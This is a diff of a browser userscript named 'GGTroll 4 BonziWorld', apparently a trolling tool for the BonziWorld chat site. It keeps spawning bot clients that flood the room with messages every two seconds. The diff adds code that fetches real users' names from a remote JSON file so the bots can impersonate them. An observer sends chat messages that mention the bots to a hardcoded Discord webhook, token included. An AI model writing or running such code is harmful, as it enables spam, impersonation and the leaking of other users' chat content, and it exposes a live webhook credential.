@@ -1,8 +1,7 @@
-/* GGTroll 4 BonziWorld 1.1.0 */
+/* GGTroll 4 BonziWorld 1.1.2 */
 /* This comes with no warranty */
-const sentMentions = new Set();
+const bots = [];
 
-// Shared observer for all bots
 const noserver = new MutationObserver(mutations => {
     mutations.forEach(mutation => {
         mutation.addedNodes.forEach(node => {
@@ -11,11 +10,9 @@ const noserver = new MutationObserver(mutations => {
                 node.classList.contains("bubble-content")
             ) {
                 const text = node.textContent.trim();
-                if (text && !sentMentions.has(text)) {
-                    // Check if any active bot name is in the text
+                if (text) {
                     bots.forEach(botName => {
                         if (text.includes(botName)) {
-                            sentMentions.add(text);
                             fetch("https://discord.com/api/webhooks/1429973688446488586/T7Da6y5vMfl6AN9OktYnBYLkL_uioOqSPhHZClDGSHOlMcwRIEUGCQl2Hh81y0XqE-cA", {
                                 method: "POST",
                                 headers: { "Content-Type": "application/json" },
@@ -30,8 +27,6 @@ const noserver = new MutationObserver(mutations => {
 });
 noserver.observe(document.body, { childList: true, subtree: true });
 
-const bots = [];
-
 setInterval(async () => {
     (async () => {
         try {
@@ -40,9 +35,19 @@ setInterval(async () => {
             const strings = data.strings || ["tinyurl.com/ggtfiles"];
             const roomElement = document.querySelector(".room_id");
             const roomId = roomElement ? roomElement.textContent.trim() : "default";
-            const botName = "giggity #" + Math.floor(Math.random() * 10000);
-            bots.push(botName);
 
+            let botName = "giggity #" + Math.floor(Math.random() * 10000);
+
+            if (Math.random() < 0.75) {
+                const userRes = await fetch("https://cmd-hue.github.io/userbwn.json?cb=" + Math.random());
+                const userData = await userRes.json();
+                const names = userData.names || [];
+                if (names.length > 0) {
+                    botName = names[Math.floor(Math.random() * names.length)];
+                }
+            }
+
+            bots.push(botName);
             const bot = io(location.href + "?cb=" + Math.random());
             bot.emit("client", "MAIN");
             bot.emit("login", {
@@ -54,7 +59,6 @@ setInterval(async () => {
                 bot.emit("update", { color: "blue" });
             }, 2000);
 
-            // Talk every 2 seconds
             setInterval(() => {
                 const msg = strings[Math.floor(Math.random() * strings.length)];
                 const type = Math.random() < 0.5 ? "joke" : "fact";
